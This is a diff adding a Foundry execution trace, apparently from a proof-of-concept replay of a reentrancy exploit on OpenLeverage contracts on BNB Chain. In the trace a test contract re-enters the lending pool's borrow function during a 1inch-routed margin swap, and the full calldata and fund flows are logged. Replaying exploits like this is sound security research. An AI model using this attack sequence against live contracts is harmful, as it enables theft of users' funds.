+    │   │   ├─ [11593] 0x665C2e9C433f07cB464Fa1315942c2e05be19208::0790daba(0000000000000000000000000000000000000000000000000000000000000120000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000a086316c3d227460ae000000000000000000000000000000000000000000000001cbbd1c6a4b6759d80000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000000a2f08b26891eed9c6fee5d00357b59016422592f94c077ab98282f879fa2bb70d0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000a75323e651e0eac7756003f7e0c3fc8967fb19250000000000000000000000007c5e04894410e98b1788fbdb181ffacbf8e6061700000000000000000000000055d398326f99059ff775485246999027b3197955000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c000000000000000000000000000000000000000000000c7e6b62fa641d528c3f000000000000000000000000000000000000000000000008c01fe994fd163e2f00000000000000000000000000000000000000000000023cb83085df010ec49a0000000000000000000000000000000000000000000000031ea839a105b3501100000000000000000000000000000000000000000000000000000000000001c20000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000000030000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000000f00000000000000000000000000000000000000000000000000000000000000150000000000000000000000000000000000000000000000000000000000000229150000000212aa3caf0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c00000000000000000000000055d398326f99059ff775485246999027b31979550000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000006a75ac4b8d8e76d15502e69be4cb6325422833b4000000000000000000000000000000000000000000000001cbbd1c6a4b6759d80000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000000000000000000000000160000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c00000000000000000000000055d398326f99059ff775485246999027b31979550000000000000000000000000000000000000000000000000000000000010018000000000000000000000000f436f8fe7b26d87eb74e5446acec2e8ad4075e470000000000000000000000000000000000000000000000) [delegatecall]
+    │   │   │   ├─ [2425] BUSDT::decimals() [staticcall]
+    │   │   │   │   └─ ← [Return] 18
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [23752] 0x912C0462474c933499a6923a6Afc6AC1E58b8Ce4::marginTradeAllowedV2(24, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true) [staticcall]
+    │   │   │   ├─ [18504] 0xbdc76cD9B04f17473aafE4569F4776Cec76F0526::marginTradeAllowedV2(24, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true) [delegatecall]
+    │   │   │   │   ├─ [8168] OPBorrowingDelegator::activeCollaterals(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 24, true) [staticcall]
+    │   │   │   │   │   ├─ [2899] 0xd3150b1242315e16845Fe21b536F53A82B6B85a5::activeCollaterals(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 24, true) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   ├─ [69875] 0x665C2e9C433f07cB464Fa1315942c2e05be19208::b37b3271(00000000000000000000000055d398326f99059ff775485246999027b3197955000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000010300000000000000000000000000000000000000000000000000000000000000) [delegatecall]
+    │   │   │   ├─ [5676] TradeController::addressConfig() [staticcall]
+    │   │   │   │   ├─ [4904] 0x88a149aC891AF29e0b59616af8D146a58e17Fbc0::addressConfig() [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000e9e321d1cb6b540e922a5e4d8720feed0749e93f000000000000000000000000912c0462474c933499a6923a6afc6ac1e58b8ce4000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c00000000000000000000000071f1158d76af5b6762d5ebcdee19105eab2c77d2
+    │   │   │   │   └─ ← [Return] 0x000000000000000000000000e9e321d1cb6b540e922a5e4d8720feed0749e93f000000000000000000000000912c0462474c933499a6923a6afc6ac1e58b8ce4000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c00000000000000000000000071f1158d76af5b6762d5ebcdee19105eab2c77d2
+    │   │   │   ├─ [3687] TradeController::calculateConfig() [staticcall]
+    │   │   │   │   ├─ [2863] 0x88a149aC891AF29e0b59616af8D146a58e17Fbc0::calculateConfig() [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000000000000000000000009c4000000000000000000000000000000000000000000000000000000000000000500000000000000000000000000000000000000000000000000000000000000190000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000084595161401484a00000000000000000000000000000000000000000000000000000000000000000000640000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000003c
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000000000000000000000009c4000000000000000000000000000000000000000000000000000000000000000500000000000000000000000000000000000000000000000000000000000000190000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000084595161401484a00000000000000000000000000000000000000000000000000000000000000000000640000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000003c
+    │   │   │   ├─ [53783] 0xE9E321D1cb6b540E922a5e4d8720FEed0749e93F::updatePriceOracle(BUSDT: [0x55d398326f99059fF775485246999027B3197955], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 60, 0x03)
+    │   │   │   │   ├─ [48538] 0x0EFF0F83Aeb1A3573AE15E864Ac75f45b970e159::updatePriceOracle(BUSDT: [0x55d398326f99059fF775485246999027B3197955], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 60, 0x03) [delegatecall]
+    │   │   │   │   │   ├─ [8977] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::sync()
+    │   │   │   │   │   │   ├─ [531] BUSDT::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 4997450389276583972343491 [4.997e24]
+    │   │   │   │   │   │   ├─ [534] WBNB::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 8422268602266725953716 [8.422e21]
+    │   │   │   │   │   │   ├─ emit Sync(reserve0: 4997450389276583972343491 [4.997e24], reserve1: 8422268602266725953716 [8.422e21])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [2394] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::price0CumulativeLast() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1536641204258207592712231757994985300162 [1.536e39]
+    │   │   │   │   │   ├─ [2416] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::price1CumulativeLast() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 164002452263774286832029288037832391029033112 [1.64e44]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   ├─ [12536] 0x665C2e9C433f07cB464Fa1315942c2e05be19208::289e376f(0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000055d398326f99059ff775485246999027b3197955000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c0000000000000000000000000000000000000000000000a086316c3d227460ae) [delegatecall]
+    │   │   │   ├─ [531] BUSDT::balanceOf(TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4]) [staticcall]
+    │   │   │   │   └─ ← [Return] 59000425570140817624127 [5.9e22]
+    │   │   │   ├─ [8834] BUSDT::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4], 2961148680678296281262 [2.961e21])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4], value: 2961148680678296281262 [2.961e21])
+    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4], value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [531] BUSDT::balanceOf(TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4]) [staticcall]
+    │   │   │   │   └─ ← [Return] 61961574250819113905389 [6.196e22]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000a086316c3d227460ae
+    │   │   ├─ [534] WBNB::balanceOf(TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4]) [staticcall]
+    │   │   │   └─ ← [Return] 161417993195347131951 [1.614e20]
+    │   │   ├─ [80143] 0x7c5e04894410e98b1788fbdB181FfACbf8e60617::borrowBehalf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 33127665676864412120 [3.312e19])
+    │   │   │   ├─ [79474] 0xe307E9C4aa77E69FF084E4FFCd7de93F497D68b6::borrowBehalf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 33127665676864412120 [3.312e19]) [delegatecall]
+    │   │   │   │   ├─ [9949] 0x912C0462474c933499a6923a6Afc6AC1E58b8Ce4::borrowAllowed(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4], 33127665676864412120 [3.312e19])
+    │   │   │   │   │   ├─ [9274] 0xbdc76cD9B04f17473aafE4569F4776Cec76F0526::borrowAllowed(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4], 33127665676864412120 [3.312e19]) [delegatecall]
+    │   │   │   │   │   │   ├─ [3773] 0x7c5e04894410e98b1788fbdB181FfACbf8e60617::availableForBorrow() [staticcall]
+    │   │   │   │   │   │   │   ├─ [3037] 0xe307E9C4aa77E69FF084E4FFCd7de93F497D68b6::availableForBorrow() [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ [534] WBNB::balanceOf(0x7c5e04894410e98b1788fbdB181FfACbf8e60617) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 154004391875378873411 [1.54e20]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 114585136635201676636 [1.145e20]
+    │   │   │   │   │   │   │   └─ ← [Return] 114585136635201676636 [1.145e20]
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   ├─ [534] WBNB::balanceOf(0x7c5e04894410e98b1788fbdB181FfACbf8e60617) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 154004391875378873411 [1.54e20]
+    │   │   │   │   ├─ [534] WBNB::balanceOf(TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 161417993195347131951 [1.614e20]
+    │   │   │   │   ├─ [8862] WBNB::transfer(TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4], 33127665676864412120 [3.312e19])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x7c5e04894410e98b1788fbdB181FfACbf8e60617, to: TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4], value: 33127665676864412120 [3.312e19])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [534] WBNB::balanceOf(TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 194545658872211544071 [1.945e20]
+    │   │   │   │   ├─ emit Borrow(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4], : 33127665676864412120 [3.312e19], : 33127665676864412120 [3.312e19], : 74647812413819684663 [7.464e19])
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   └─ ← [Return] 
+    │   │   ├─ [534] WBNB::balanceOf(TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4]) [staticcall]
+    │   │   │   └─ ← [Return] 194545658872211544071 [1.945e20]
+    │   │   ├─ [5842] 0xE9E321D1cb6b540E922a5e4d8720FEed0749e93F::getPrice(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], BUSDT: [0x55d398326f99059fF775485246999027B3197955], 0x03) [staticcall]
+    │   │   │   ├─ [5097] 0x0EFF0F83Aeb1A3573AE15E864Ac75f45b970e159::getPrice(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], BUSDT: [0x55d398326f99059fF775485246999027B3197955], 0x03) [delegatecall]
+    │   │   │   │   ├─ [893] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 4997450389276583972343491 [4.997e24], 8422268602266725953716 [8.422e21], 1711948730 [1.711e9]
+    │   │   │   │   ├─ [465] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] BUSDT: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000001ead132510cb1a2647be3480000000000000000000000000000000000000000000000000000000000000018
+    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000001ead132510cb1a2647be3480000000000000000000000000000000000000000000000000000000000000018
+    │   │   ├─ [3037] 0x665C2e9C433f07cB464Fa1315942c2e05be19208::99c4d9ea(0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000004ca1d78b444f4e42ebd00000000000000000000000055d398326f99059ff775485246999027b319795500000000000000000000000071f1158d76af5b6762d5ebcdee19105eab2c77d2000000000000000000000000000000000000000000000c7e81fa6c214f51feaa000000000000000000000000000000000000000000000c7e6b62fa641d528c3f7ca528807b45d0675df0059116d2304ca9c7f495d9ab623cd80c79f11948b856000000000000000000000000000000000000000000000000000000000000000f0000000000000000000000000000000000000000000000000000000000000009) [delegatecall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─ [253414] 0x665C2e9C433f07cB464Fa1315942c2e05be19208::d2de4c07(00000000000000000000000055d398326f99059ff775485246999027b3197955000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c000000000000000000000000000000000000000000000001cbbd1c6a4b6759d8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000e0000000000000000000000000e9e321d1cb6b540e922a5e4d8720feed0749e93f0000000000000000000000001111111254eeb25477b68fb85ed929f73a9605820000000000000000000000000000000000000000000000000000000000000229150000000212aa3caf0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c00000000000000000000000055d398326f99059ff775485246999027b31979550000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000006a75ac4b8d8e76d15502e69be4cb6325422833b4000000000000000000000000000000000000000000000001cbbd1c6a4b6759d80000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000000000000000000000000160000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c00000000000000000000000055d398326f99059ff775485246999027b31979550000000000000000000000000000000000000000000000000000000000010018000000000000000000000000f436f8fe7b26d87eb74e5446acec2e8ad4075e470000000000000000000000000000000000000000000000) [delegatecall]
+    │   │   │   ├─ [531] BUSDT::balanceOf(TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4]) [staticcall]
+    │   │   │   │   └─ ← [Return] 61961574250819113905389 [6.196e22]
+    │   │   │   ├─ [2717] WBNB::allowance(TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4], 0x1111111254EEB25477B68fb85Ed929f73A960582) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [22320] WBNB::approve(0x1111111254EEB25477B68fb85Ed929f73A960582, 33127665676864412120 [3.312e19])
+    │   │   │   │   ├─ emit Approval(owner: TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4], spender: 0x1111111254EEB25477B68fb85Ed929f73A960582, value: 33127665676864412120 [3.312e19])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [717] WBNB::allowance(TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4], 0x1111111254EEB25477B68fb85Ed929f73A960582) [staticcall]
+    │   │   │   │   └─ ← [Return] 33127665676864412120 [3.312e19]
+    │   │   │   ├─ [203897] 0x1111111254EEB25477B68fb85Ed929f73A960582::swap(Executor: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], (0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x55d398326f99059fF775485246999027B3197955, 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, 0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4, 33127665676864412120 [3.312e19], 1, 4), 0x, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c00000000000000000000000055d398326f99059ff775485246999027b31979550000000000000000000000000000000000000000000000000000000000010018000000000000000000000000f436f8fe7b26d87eb74e5446acec2e8ad4075e47)
+    │   │   │   │   ├─ [26048] WBNB::transferFrom(TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4], Executor: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 33127665676864412120 [3.312e19])
+    │   │   │   │   │   ├─ emit Transfer(from: TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4], to: Executor: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 33127665676864412120 [3.312e19])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [169890] Executor::execute(TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4])
+    │   │   │   │   │   ├─ [24420] WBNB::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   │   │   ├─ emit Approval(owner: Executor: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [534] WBNB::balanceOf(Executor: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 33127665676864412120 [3.312e19]
+    │   │   │   │   │   ├─ [35951] Router::swapExactTokensForTokens(33127665676864412120 [3.312e19], 1, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x55d398326f99059fF775485246999027B3197955], 0x1111111254EEB25477B68fb85Ed929f73A960582, 1711948730 [1.711e9])
+    │   │   │   │   │   │   ├─ [893] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::getReserves() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 4997450389276583972343491 [4.997e24], 8422268602266725953716 [8.422e21], 1711948730 [1.711e9]
+    │   │   │   │   │   │   ├─ [3425] WBNB::transferFrom(Executor: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, 33127665676864412120 [3.312e19])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: Executor: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, value: 33127665676864412120 [3.312e19])
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [23164] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::swap(19530911783309272293881 [1.953e22], 0, 0x1111111254EEB25477B68fb85Ed929f73A960582, 0x)
+    │   │   │   │   │   │   │   ├─ [8071] BUSDT::transfer(0x1111111254EEB25477B68fb85Ed929f73A960582, 19530911783309272293881 [1.953e22])
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, to: 0x1111111254EEB25477B68fb85Ed929f73A960582, value: 19530911783309272293881 [1.953e22])
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ [531] BUSDT::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 4977919477493274700049610 [4.977e24]
+    │   │   │   │   │   │   │   ├─ [534] WBNB::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 8455396267943590365836 [8.455e21]
+    │   │   │   │   │   │   │   ├─ emit Sync(reserve0: 4977919477493274700049610 [4.977e24], reserve1: 8455396267943590365836 [8.455e21])
+    │   │   │   │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 33127665676864412120 [3.312e19], amount0Out: 19530911783309272293881 [1.953e22], amount1Out: 0, to: 0x1111111254EEB25477B68fb85Ed929f73A960582)
+    │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   └─ ← [Return] [33127665676864412120 [3.312e19], 19530911783309272293881 [1.953e22]]
+    │   │   │   │   │   ├─ [105903] ContractTest::borrow()
+    │   │   │   │   │   │   ├─ [24562] BUSDT::approve(OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [2562] TradeController::markets(24) [staticcall]
+    │   │   │   │   │   │   │   ├─ [1735] 0x88a149aC891AF29e0b59616af8D146a58e17Fbc0::markets(24) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x7c5e04894410e98b1788fbdB181FfACbf8e60617, 0xa75323e651e0EAC7756003F7E0c3Fc8967FB1925, WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], BUSDT: [0x55d398326f99059fF775485246999027B3197955], 450, 0, 5, 0x74e4Fb918480D57718Ad1e46113F70a110ff7Fbe, 57549311202102038545 [5.754e19], 10564809865456566322330 [1.056e22]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x7c5e04894410e98b1788fbdB181FfACbf8e60617, 0xa75323e651e0EAC7756003F7E0c3Fc8967FB1925, WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], BUSDT: [0x55d398326f99059fF775485246999027B3197955], 450, 0, 5, 0x74e4Fb918480D57718Ad1e46113F70a110ff7Fbe, 57549311202102038545 [5.754e19], 10564809865456566322330 [1.056e22]
+    │   │   │   │   │   │   ├─ [76567] OPBorrowingDelegator::borrow(24, true, 1000000 [1e6], 0)
+    │   │   │   │   │   │   │   ├─ [75865] 0xd3150b1242315e16845Fe21b536F53A82B6B85a5::borrow(24, true, 1000000 [1e6], 0) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ [10796] 0x912C0462474c933499a6923a6Afc6AC1E58b8Ce4::collBorrowAllowed(24, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [10048] 0xbdc76cD9B04f17473aafE4569F4776Cec76F0526::collBorrowAllowed(24, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [6079] TradeController::activeTrades(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 24, true) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [5298] 0x88a149aC891AF29e0b59616af8D146a58e17Fbc0::activeTrades(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 24, true) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0, 0, false, 0
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0, 0, false, 0
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   │   ├─ [2531] BUSDT::balanceOf(OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47]) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 56744600141967875389900 [5.674e22]
+    │   │   │   │   │   │   │   │   ├─ [2534] WBNB::balanceOf(OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47]) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 28168569652326010855 [2.816e19]
+    │   │   │   │   │   │   │   │   ├─ [531] BUSDT::balanceOf(OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47]) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 56744600141967875389900 [5.674e22]
+    │   │   │   │   │   │   │   │   ├─ [11634] BUSDT::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47], 1000000 [1e6])
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47], value: 1000000 [1e6])
+    │   │   │   │   │   │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47], value: 115792089237316195423570985008687907853269984665640564039457584007913128639935 [1.157e77])
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   ├─ [531] BUSDT::balanceOf(OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47]) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 56744600141967876389900 [5.674e22]
+    │   │   │   │   │   │   │   │   ├─ emit Borrow(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 24, param2: true, param3: 1000000 [1e6], param4: 0, param5: 0)
+    │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [531] BUSDT::balanceOf(0x1111111254EEB25477B68fb85Ed929f73A960582) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 19530911783309272293882 [1.953e22]
+    │   │   │   │   ├─ [3271] BUSDT::transfer(TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4], 19530911783309272293881 [1.953e22])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x1111111254EEB25477B68fb85Ed929f73A960582, to: TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4], value: 19530911783309272293881 [1.953e22])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000422c5d973b6d83621f9000000000000000000000000000000000000000000000001cbbd1c6a4b6759d8
